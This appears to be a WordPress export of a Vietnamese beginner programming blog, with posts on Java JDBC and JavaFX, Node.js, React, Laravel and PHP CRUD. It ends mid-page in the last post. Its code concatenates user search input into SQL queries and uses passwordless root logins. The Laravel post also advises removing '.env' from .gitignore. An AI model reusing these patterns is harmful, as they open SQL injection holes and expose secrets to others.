		<content:encoded><![CDATA[<img src="https://images.viblo.asia/31d58a8f-02d8-4078-ae8d-33385ef6193b.png" alt="JDBC" />

Kết nối vớiJDBC
<pre>
public class Main {
    public static void main(String[] args) {
        try{
            Class.forName("com.mysql.jdbc.Driver");
            String url = "jdbc:mysql://localhost:3306/databasename?useUnicode=true&&characterEncoding=utf-8";
            String username = "root";
            String password = "";
            Connection conn = DriverManager.getConnection(url,username,password);

            Statement stm = conn.createStatement();

            String ins_sql = "INSERT INTO student(student_name,age,mark) VALUES('Ngô Vên Duy',18,2)";
            stm.executeUpdate(ins_sql);

            String sql = "SELECT * FROM student";

            ResultSet rs = stm.executeQuery(sql);
            System.out.println(rs);

            while (rs.next()){
                System.out.println(rs.getInt("id"));
                System.out.println(rs.getString("student_name"));
                System.out.println(rs.getInt("age"));
                System.out.println(rs.getInt("mark"));

            }
        }
        catch (Exception e){
            System.out.println(e.getMessage());
        }
    }
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>141</wp:post_id>
		<wp:post_date><![CDATA[2019-11-09 11:37:50]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-11-09 11:37:50]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-11-09 11:37:50]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-11-09 11:37:50]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[jdbc-la-gi]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
						</item>
					<item>
		<title><![CDATA[JAVA - Tổng quan]]></title>
		<link>https://duycode.com/2019/11/09/java-tong-quan/</link>
		<pubDate>Sat, 09 Nov 2019 11:52:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=143</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://d1jnx9ba8s6j9r.cloudfront.net/blog/wp-content/uploads/2018/01/2-2-768x685.png" alt="" />
1. Hướng đối tượng: Class, Object, Interface
2. Implement và Extend, Throws
3. Class Frame
- Datetime
- Try .. catch
- Collections.sort

4. Java Application: Java Fx
- File FXML: fx:controller =""; fx:id ="", onAction="#";
- Stage, Scene
- implements Initializable
5. Java Input/Output
6. Đa luồng: Thread, Runnable
- wait(), notify()
7. Connect Database:
- JDBC]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>143</wp:post_id>
		<wp:post_date><![CDATA[2019-11-09 11:52:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-11-09 11:52:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-11-09 11:52:00]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-11-09 11:52:00]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java-tong-quan]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
						</item>
					<item>
		<title><![CDATA[JAVA - Throwable - Exception - Error]]></title>
		<link>https://duycode.com/2019/11/09/java-throwable-exception-error/</link>
		<pubDate>Sat, 09 Nov 2019 20:31:52 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=145</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="https://lh5.googleusercontent.com/WqqNoyFEkZXfmZBBQjgIutY72_BUV6_By_BAe7Ih9u36HfelS3nTWQEYtdRUkQS32Tuhg9P9CUXo-jgvOpkO84vLm2viI4Od0BNustwONdMm7DKZnKC6kyVHyRJbsESLIPV4uBU" alt="" />]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>145</wp:post_id>
		<wp:post_date><![CDATA[2019-11-09 20:31:52]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-11-09 20:31:52]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-11-09 20:31:52]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-11-09 20:31:52]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java-throwable-exception-error]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
						</item>
					<item>
		<title><![CDATA[NODEJS – 2. CÁC THƯ VIỆN CƠ BẢN]]></title>
		<link>https://duycode.com/?p=708</link>
		<pubDate></pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=708</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Nodemon</h2>
- Dùng để tự động chạy lại ứng dụng khi có sự thay đổi về code
<a href="https://www.npmjs.com/package/nodemon" rel="noopener" target="_blank">https://www.npmjs.com/package/nodemon</a>
<blockquote>
npm i nodemon --save-dev
</blockquote>

<h3>Sử dụng</h3>
- Tại file package.json, sửa key: scripts
<pre>
  "scripts": {
    "start": "nodemon index.js",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
</pre>
- Mỗi lần khởi chạy, giờ chỉ cần dùng lệnh:
<blockquote>
npm start
</blockquote>

<h3>Sử dụng Debug</h3>
<pre>
  "scripts": {
    "start": "nodemon --inspect index.js",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
</pre>


<h2>2. Morgan</h2>
-- Link: <a href="https://www.npmjs.com/package/morgan" rel="noopener" target="_blank">https://www.npmjs.com/package/morgan</a>
-- Cài đặt:
<blockquote>
npm i morgan --save-dev
</blockquote>
<h3>Tác dụng</h3>
- Mỗi một request đến server, ta thấy console log đã hiện ra thông tin địa chỉ request


<h2>3. Sử dụng Express Handlebars</h2>
-- Link: <a href="https://www.npmjs.com/package/express-handlebars" rel="noopener" target="_blank">https://www.npmjs.com/package/express-handlebars</a>
-- Cài đặt:
<blockquote>
npm install express-handlebars
</blockquote>

<h3> Tại file: src/resources/views/layouts/main.hbs</h3>
<pre>
<body>
    {{> header}}
    <div class="container">
        {{{body}}}
    </div>
    {{> footer}}
</body>
</pre>
-- Khi render bất kỳ một file nào, server sẽ render file main.hbs đầu tiên.
-- Sau đó file được render sẽ đi vào phần {{{body}}}
-- {{> header}} và {{> footer}} sẽ được lấy trong partials

<h2>4. Sử dụng SCSS</h2>
-- Link: <a href="https://www.npmjs.com/package/node-sass" rel="noopener" target="_blank">https://www.npmjs.com/package/node-sass</a>
-- Cài đặt
<blockquote>npm install node-sass --save-dev</blockquote>
-- Sử dụng
<pre>node-sass [options] <input> [output] </pre>
-- Tại file package.json
<pre>
  "main": "src/index.js",
  "scripts": {
    "start": "nodemon --inspect src/index.js",
    "watch":"node-sass --watch src/resources/scss/app.scss src/public/css/app.css",
    "test": "echo \"Error: no test specified\" && exit 1"
  },
</pre>
-- chạy terminal
<blockquote>npm run watch</blockquote>

Note: File index hiện tại như sau:
<pre>
const path = require('path');
const express = require('express');
const morgan = require('morgan');
const handlebars = require('express-handlebars');

const app = express();
const port = 3000;

//Static public link
app.use(express.static(path.join(__dirname, 'public/')));

//HTTP logger
app.use(morgan('combined'));

//Template engine
app.engine('hbs', handlebars({
  extname: '.hbs'
}));
app.set('view engine', 'hbs');
app.set('views',path.join(__dirname,'resources/views'));

app.get('/', (req, res) => {
  res.render('home');
  // res.send('<h1>Hello World!</h1>');
})

app.get('/news', (req, res) => {
  res.render('news');
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`);
})
</pre>





]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>708</wp:post_id>
		<wp:post_date><![CDATA[2021-01-18 01:15:02]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[0000-00-00 00:00:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-01-18 01:15:02]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[0000-00-00 00:00:00]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[ReactJS - Cơ bản]]></title>
		<link>https://duycode.com/?p=979</link>
		<pubDate></pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=979</guid>
		<description></description>
		<content:encoded><![CDATA[1. Develop tool for Chrome
- React Developer Tools
2. Cài Nodejs
- Kiểm tra máy đã cài nodejs chưa, dùng cmd
node -v
npm -v
3. Cài yarn
4. Cài sublime Text 3
5 Install Package Control for Sublime
- Cài đặt các package:
JSX/Babel Syntax Highlighting
Babel Snippets
Emmet

6. Cài đặt ban đầu
dùng cmd ở thư mục muốn cài
npx create-react-app my-app
cd my-app
npm start
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>979</wp:post_id>
		<wp:post_date><![CDATA[2021-05-08 15:59:22]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[0000-00-00 00:00:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-08 15:59:22]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[0000-00-00 00:00:00]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mang-may-tinh"><![CDATA[Mạng Máy Tính]]></category>
						</item>
					<item>
		<title><![CDATA[Reac]]></title>
		<link>https://duycode.com/?p=1314</link>
		<pubDate></pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1314</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1314</wp:post_id>
		<wp:post_date><![CDATA[2021-07-02 14:02:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[0000-00-00 00:00:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-02 14:02:41]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[0000-00-00 00:00:00]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mang-may-tinh"><![CDATA[Mạng Máy Tính]]></category>
						</item>
					<item>
		<title><![CDATA[VUEJS - Khởi tạo Vue và Component]]></title>
		<link>https://duycode.com/?p=1621</link>
		<pubDate></pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=1621</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>

</h2>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1621</wp:post_id>
		<wp:post_date><![CDATA[2021-07-29 21:45:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[0000-00-00 00:00:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-07-29 21:45:31]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[0000-00-00 00:00:00]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="mang-may-tinh"><![CDATA[Mạng Máy Tính]]></category>
						</item>
					<item>
		<title><![CDATA[Docker - 8. docker-compose]]></title>
		<link>https://duycode.com/?p=2291</link>
		<pubDate></pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2291</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2291</wp:post_id>
		<wp:post_date><![CDATA[2022-06-18 18:51:36]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[0000-00-00 00:00:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-06-18 18:51:36]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-06-18 11:51:36]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[JAVA Application -JavaFX]]></title>
		<link>https://duycode.com/2019/11/13/java-application-javafx/</link>
		<pubDate>Wed, 13 Nov 2019 13:59:35 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=147</guid>
		<description></description>
		<content:encoded><![CDATA[Main.class
<img src="https://docs.oracle.com/javase/8/javafx/get-started-tutorial/img/login.png" alt="" />
<pre>
package duycode;

import ...;

public class Main extends Application {
    public static void main(String[] args) {
        launch(args);
    }
    public static Stage mainStage;

    @Override
    public void start(Stage primaryStage) {
        mainStage = primaryStage;
        try{
            Parent root = FXMLLoader.load(getClass().getResource("listperson.fxml"));
            Scene scene = new Scene(root,400,600);
            primaryStage.setScene(scene);
            primaryStage.setTitle("List Person");
            primaryStage.show();
        }
        catch (Exception e){
            System.out.println(e.getMessage());
        }
    }
}
</pre>

ConnectMySQL.class
<pre>
package duycode;

import ...;

public class ConnectMySQL {
    public static Connection ConnectMySQL() throws Exception{
        Class.forName("com.mysql.jdbc.Driver");
        String url = "jdbc:mysql://localhost:3306/duycode?useUnicode=true&characterEncoding=utf-8";
        String username = "root";
        String password = "";
        return DriverManager.getConnection(url,username,password);
    }
}
</pre>

listperson.fxml
<pre>
<?xml version="1.0" encoding="UTF-8"?>

<?import javafx.scene.text.*?>
<?import javafx.scene.control.*?>
<?import javafx.scene.layout.*?>

<Pane fx:controller="duycode.ListStudents" maxHeight="-Infinity" maxWidth="-Infinity" minHeight="-Infinity" minWidth="-Infinity" prefHeight="613.0" prefWidth="600.0" xmlns="http://javafx.com/javafx/8" xmlns:fx="http://javafx.com/fxml/1">
   <children>
       <Text layoutX="210.0" layoutY="57.0" strokeType="OUTSIDE" strokeWidth="0.0" text="List Students">
           <font>
                <Font size="32.0" />
           </font>
       </Text>
       <TextField fx:id="searchName" layoutX="315.0" layoutY="100.0" onAction="#searchname" prefHeight="31.0" prefWidth="265.0" promptText="Search name" />
       <TableView fx:id="tbView" layoutX="20.0" layoutY="143.0" prefHeight="374.0" prefWidth="560.0">
           <columns>
                <TableColumn fx:id="colID" prefWidth="67.0" text="ID" />
                <TableColumn fx:id="colName" prefWidth="228.0" text="Name" />
                <TableColumn fx:id="colAge" prefWidth="118.0" text="Age" />
                <TableColumn fx:id="colMark" prefWidth="145.0" text="Mark" />
           </columns>
       </TableView>
      <Button onAction="#addStudent" layoutX="400.0" layoutY="541.0" mnemonicParsing="false" prefHeight="31.0" prefWidth="180.0" text="Add Student" />
      <Button onAction="#deleteStudent" layoutX="20.0" layoutY="541.0" mnemonicParsing="false" text="Delete" />
   </children>
</Pane>
</pre>


ListStudent.class
<pre>
package duycode;

import ...;

public class ListStudents implements Initializable {
    public TableView<Student> tbView = new TableView<>();
    public TableColumn<Student,Integer> colID = new TableColumn<>();
    public TableColumn<Student,String> colName = new TableColumn<>();
    public TableColumn<Student,Integer> colAge = new TableColumn<>();
    public TableColumn<Student,Double> colMark = new TableColumn<>();
    public TextField searchName = new TextField();


    @Override
    public void initialize(URL location, ResourceBundle resources) {
        colID.setCellValueFactory(new PropertyValueFactory<>("id"));
        colName.setCellValueFactory(new PropertyValueFactory<>("name"));
        colAge.setCellValueFactory(new PropertyValueFactory<>("age"));
        colMark.setCellValueFactory(new PropertyValueFactory<>("mark"));

        String queryData = "SELECT * FROM liststudent";
        selectquery(queryData);
    }

    public void selectquery(String queryData){
        ObservableList<Student> list1 = FXCollections.observableArrayList();
        try{
            Connection conn = ConnectMySQL.ConnectMySQL();
            Statement stm = conn.createStatement();
            ResultSet resultData = stm.executeQuery(queryData);

            while (resultData.next()){
                list1.add(new Student(
                        resultData.getInt("id"),
                        resultData.getString("student_name"),
                        resultData.getInt("age"),
                        resultData.getDouble("mark"))
                );
            }
            conn.close();
        }
        catch (Exception e){
            System.out.println(e.getMessage());
        }
        tbView.setItems(list1);
    }

    public void searchname(){
        String txtSearch = searchName.getText();
        String queryData = "SELECT * FROM liststudent WHERE student_name LIKE '%"+txtSearch+"%'";
        selectquery(queryData);
    }

    public void deleteStudent(){
        int deleteID = tbView.getSelectionModel().getSelectedItems().get(0).getId();
        String deleteSelect = "DELETE FROM liststudent WHERE id="+deleteID;
        confirmdelete(deleteSelect);
    }

    public void confirmdelete(String deleteSelect){
        Pane confirm = new Pane();
        confirm.setPadding(new Insets(20,200,0,10));
        Text textconfirm = new Text(150,50,"Are you sure ?");
        Font fontcf = new Font("Arial",20);
        textconfirm.setFont(fontcf);
        Button button1 = new Button("Yes");
        button1.setLayoutX(75);
        button1.setLayoutY(100);
        button1.setPrefSize(100,25);
        Button button2 = new Button("No");
        button2.setLayoutX(225);
        button2.setLayoutY(100);
        button2.setPrefSize(100,25);
        confirm.getChildren().addAll(textconfirm,button1,button2);
        Scene scenecofirm = new Scene(confirm, 400,200);
        Stage stageconfirm = new Stage();
        stageconfirm.setTitle("Yes or No");
        stageconfirm.setScene(scenecofirm);
        stageconfirm.show();
        button1.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                try{
                    Connection conn = ConnectMySQL.ConnectMySQL();
                    Statement stm = conn.createStatement();
                    stm.executeUpdate(deleteSelect);
                    conn.close();
                }
                catch (Exception e){
                    System.out.println(e.getMessage());
                }
                String queryData = "SELECT * FROM liststudent";
                selectquery(queryData);
                stageconfirm.close();
            }
        });
        button2.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                stageconfirm.close();
            }
        });
    }

    public void addStudent(){
        try{
            Parent addStudent = FXMLLoader.load(getClass().getResource("addstudent.fxml"));
            Main.mainStage.getScene().setRoot(addStudent);
            Main.mainStage.setTitle("Add student");
        }
        catch (Exception e){
            System.out.println(e.getMessage());
        }

    }
}
</pre>



]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>147</wp:post_id>
		<wp:post_date><![CDATA[2019-11-13 13:59:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-11-13 13:59:35]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-11-13 13:59:35]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-11-13 13:59:35]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java-application-javafx]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
						</item>
					<item>
		<title><![CDATA[JAVA - Input / Output]]></title>
		<link>https://duycode.com/2019/11/26/java-input-output/</link>
		<pubDate>Tue, 26 Nov 2019 12:14:50 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=162</guid>
		<description></description>
		<content:encoded><![CDATA[<img src="http://giasutinhoc.vn/wp-content/uploads/2016/02/doc-va-ghi-file-trong-java-1.jpg" alt="Luồng đọc ghi" />
<img src="http://giasutinhoc.vn/wp-content/uploads/2016/02/doc-va-ghi-file-trong-java-3.jpg" alt="Input và Reader" />
<img src="http://giasutinhoc.vn/wp-content/uploads/2016/02/doc-va-ghi-file-trong-java-4.jpg" alt="Output và Write" />

<pre>
package Test;

import java.io.*;

public class Main{
    public static void main(String[] args) {
        File f = new File("C:\\Users\\Duy\\Desktop\\liststudent.txt");
        String ftxt = "Student ID, Student Name, Address, Phone \n";
        if (f.canWrite()) {
            try {
                FileOutputStream fos = new FileOutputStream(f);
                DataOutputStream dos = new DataOutputStream(fos);
                for (Student st : arrayList) {
                    String s = st.getStudentID() + "," + st.getStudentName() + "," + st.getAddress() + "," + st.getPhone() + " \n";
                    ftxt = ftxt + s;
                }
                dos.writeBytes(ftxt);
                dos.close();
                fos.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        if (f.canRead()) {
            try {
                FileInputStream fis = new FileInputStream(f);
                DataInputStream dis = new DataInputStream(fis);
                String line = "";
                while ((line = dis.readLine()) != null) {
                    ftxt += line + "\n";
                    String[] strs = line.split("-");
                    Student s = new Student(strs[0], Integer.parseInt(strs[1]),
                            Integer.parseInt(strs[2]));
                    arr.add(s);
                }
                dis.close();
                fis.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
</pre>
        ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>162</wp:post_id>
		<wp:post_date><![CDATA[2019-11-26 12:14:50]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-11-26 12:14:50]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2019-11-26 12:14:50]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2019-11-26 12:14:50]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java-input-output]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
						</item>
					<item>
		<title><![CDATA[Laravel - Cài đặt và sử dụng]]></title>
		<link>https://duycode.com/2020/02/26/laravel-cai-dat-va-su-dung/</link>
		<pubDate>Wed, 26 Feb 2020 15:10:29 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=187</guid>
		<description></description>
		<content:encoded><![CDATA[Các phần mềm cần thiết khi học PHP
<img src="https://quachquynh.com/wp-content/uploads/2019/11/lap-trinh-php-1.jpg" alt="" />
<h3>I. XAMPP:</h3>
- Download: <a href="https://www.apachefriends.org/index.html" rel="noopener noreferrer" target="_blank">https://www.apachefriends.org/index.html</a>
Khi cài đặt XAMPP xuất hiện lỗi: Thường bị chiếm cổng Port 80, có thể xem phần mềm nào đang chiếm cổng 80: 
- Dùng cmd
<blockquote>netstat -ano</blockquote>
- Vào:Task Manager->Details Tìm phần mềm có PID tương ứng
- Chuyển cổng mặc định của XAMPP là 80 sang 81:
- Vào XAMPP -> Config(Apache) -> Apache(httpd.conf) -> Search và chuyển hết 80 thành 81
- Vào XAMPP -> Config(Apache) -> Apache(httpd-ssl.conf) -> Search và chuyển hết 443 thành 4433

<h3>II. Composer:</h3>
- Link: <a href="https://getcomposer.org/download/" rel="noopener noreferrer" target="_blank">https://getcomposer.org/download/</a>
- Trong quá trình cài đặt: khi cần trỏ vào php thì trỏ vào: ...\Xampp\php\php.exe

<h3>III. Cài đặt Laravel</h3>
<h4>1. Cài đặt</h4>
- Hướng dẫn cài: <a href="https://laravel.com/docs/5.8/installation" rel="noopener noreferrer" target="_blank">https://laravel.com/docs/5.8/installation</a>
- Cài đặt full: Dùng Command Prompt gõ lệnh:
<pre>
//trỏ vào thư mục htdocs
cd C:/Xampp/htdocs

//tạo project laravel, với yourfolders là thư mục bạn muốn cài
composer create-project --prefer-dist laravel/laravel yourfolders "5.8.*"
</pre>

<h4>2. Một số lệnh thường dùng</h4>
<pre>
//Create file Controller:
php artisan make:controller WebController

//Create file Model
php artisan make:model Category

//Create Migration:
//create_category: là tạo class CreateCategory
//create=category: là tạo bảng tên category
php artisan make:migration create_product --create=product

//run Migration
php artisan migrate
//xóa các bảng đã tạo
php artisan migrate:fresh

//Create Seed
php artisan make:seeder CategorySeeder
//run Seed
php artisan db:seed

//refresh Seed
php artisan migrate:refresh --seed

//Refresh Cache
php artisan config:cache
</pre>

<h4>3. Connect Heroku và Github</h4>
- Login Github trên Heroku và để Automatic deploys
- Tại thư mục gốc Project Laravel, tạo 1 file: Procfile (ko có đuôi mở rộng) với nội dung:
<pre>web: vendor/bin/heroku-php-apache2 public/</pre>
- Tại .gitignore -> bỏ dòng ".env"
- Deploys lần đầu tại Heroku và xem kết quả :D]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>187</wp:post_id>
		<wp:post_date><![CDATA[2020-02-26 15:10:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2020-02-26 15:10:29]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2020-02-26 15:10:29]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2020-02-26 15:10:29]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[laravel-cai-dat-va-su-dung]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="laravel"><![CDATA[Laravel]]></category>
						</item>
					<item>
		<title><![CDATA[PHP - Hiển thị danh sách User, thêm, sửa, xóa User bằng PHP]]></title>
		<link>https://duycode.com/2020/03/08/php-hien-thi-danh-sach-user-them-sua-xoa-user-bang-php/</link>
		<pubDate>Sun, 08 Mar 2020 06:28:44 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=200</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Tạo model kết nối database</h2>
-- Tạo file: model/connection.php
<pre>
<?php
//server info
$serverName = "localhost";
$serverUser = "root";
$serverPassword = "";
$database = "phongkhamdemo";

//connect database
$conn = new mysqli($serverName,$serverUser,$serverPassword,$database);

//check connection
if($conn->connect_error){
    die("Connection failed");
}
?>
</pre>

<h2>2. Hiển thị danh sách User</h2>
-- Tạo file: view/admin/user_list.php
<pre>
<!DOCTYPE html>
<html>

<head>
    <title>User Management</title>
</head>

<body>
    <table border="1" style="border-collapse: collapse;">
        <thead>
            <tr>
                <th>ID</th>
                <th>Username</th>
                <th>Password</th>
                <th>Email</th>
                <th>Phone</th>
                <th>Address</th>
                <th>Permission</th>
                <th>Action</th>
